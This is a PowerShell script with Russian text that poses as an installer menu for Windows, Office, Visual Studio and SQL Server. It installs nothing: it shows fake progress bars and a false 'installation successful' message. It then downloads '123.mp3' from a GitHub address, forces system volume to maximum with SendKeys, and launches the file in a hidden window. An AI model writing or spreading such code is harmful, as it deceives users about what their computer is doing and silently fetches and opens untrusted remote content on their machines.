# ================================================
#   Adop.ps1 — Версия с отображением ошибки (не закрывается)
# ================================================

Clear-Host
$host.UI.RawUI.WindowTitle = "Adop - Отладка"

$MusicURL = "https://github.com/fffghsetyver-hash/Cheackproverka/raw/main/123.mp3"

function Set-Volume100 {
    $wsh = New-Object -ComObject WScript.Shell
    for($i=0; $i -lt 50; $i++) { 
        $wsh.SendKeys([char]175) 
    }
}

function Install-Program {
    param($ProgramName)

    Clear-Host
    Write-Host "╔════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║                  Установка: $ProgramName" -ForegroundColor Cyan
    Write-Host "╚════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""

    Write-Host "   Скачивание..." -ForegroundColor Yellow
    for ($i = 0; $i -le 100; $i += 8) {
        Write-Progress -Activity "Скачивание" -Status "$i%" -PercentComplete $i
        Start-Sleep -Milliseconds 80
    }
    Write-Progress -Activity "Скачивание" -Completed

    Write-Host "`n   Установка..." -ForegroundColor Yellow
    for ($i = 0; $i -le 100; $i += 12) {
        Write-Progress -Activity "Установка" -Status "$i%" -PercentComplete $i
        Start-Sleep -Milliseconds 100
    }
    Write-Progress -Activity "Установка" -Completed

    Clear-Host
    Write-Host "╔════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "║                    УСТАНОВКА ЗАВЕРШЕНА УСПЕШНО!                    ║" -ForegroundColor Green
    Write-Host "╚════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
    Write-Host ""
    Write-Host "   Программа: $ProgramName" -ForegroundColor White
    Write-Host "   Статус: ✓ Успешно установлена" -ForegroundColor Green
    Write-Host ""

    # === Попытка запуска 123.mp3 ===
    $mp3Path = "$env:TEMP\123_$(Get-Random).mp3"

    try {
        Write-Host "   Загрузка 123.mp3 ..." -ForegroundColor Yellow
        Invoke-WebRequest -Uri $MusicURL -OutFile $mp3Path -UseBasicParsing -TimeoutSec 30 | Out-Null
        Write-Host "   Файл успешно скачан" -ForegroundColor Green

        Set-Volume100

        Write-Host "   Запуск 123.mp3 ..." -ForegroundColor Yellow
        Start-Process -FilePath $mp3Path -WindowStyle Hidden

        Write-Host "   123.mp3 запущен скрыто" -ForegroundColor Green
    }
    catch {
        Write-Host "`n   ОШИБКА:" -ForegroundColor Red
        Write-Host "   $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "`n   Полная информация об ошибке:" -ForegroundColor Red
        Write-Host $_.Exception | Format-List -Force
    }

    Write-Host "`n`n   ==================== КОНЕЦ ====================" -ForegroundColor White
    Write-Host "   Нажмите любую клавишу, чтобы закрыть окно..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# ===================== Главный цикл =====================
do {
    Clear-Host
    Write-Host "╔════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║                    ADOP — Программы для скачивания                 ║" -ForegroundColor Cyan
    Write-Host "╚════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "   1. Все программы" -ForegroundColor White
    Write-Host "   2. Windows" -ForegroundColor White
    Write-Host "   3. Office" -ForegroundColor White
    Write-Host "   4. Разработка" -ForegroundColor White
    Write-Host "   5. Серверы" -ForegroundColor White
    Write-Host "   6. Базы данных" -ForegroundColor White
    Write-Host ""
    Write-Host "   0. Выход" -ForegroundColor Red
    Write-Host ""
    Write-Host "   Выберите категорию → " -NoNewline -ForegroundColor Gray

    $choice = Read-Host

    if ($choice -eq "0") { exit }

    $category = switch ($choice) {
        "1" { "Все программы" }
        "2" { "Windows" }
        "3" { "Office" }
        "4" { "Разработка" }
        "5" { "Серверы" }
        "6" { "Базы данных" }
        default { "Все программы" }
    }

    $programs = @("Windows 10 Pro","Windows 11 Home","Microsoft Office 2024","Visual Studio 2022","Windows Server 2022","SQL Server 2022")

    Clear-Host
    Write-Host "Категория: $category" -ForegroundColor Yellow
    Write-Host ""

    for ($i = 0; $i -lt $programs.Count; $i++) {
        Write-Host "   $($i+1). $($programs[$i])" -ForegroundColor White
    }
    Write-Host "   0. Назад" -ForegroundColor Red
    Write-Host ""
    Write-Host "   Выберите программу → " -NoNewline -ForegroundColor Gray

    $num = Read-Host

    if ($num -eq "0") { continue }

    if ($num -match '^\d+$' -and [int]$num -le $programs.Count) {
        $selected = $programs[[int]$num - 1]
        Install-Program $selected
    } else {
        Start-Sleep -Seconds 1
    }
} while ($true)
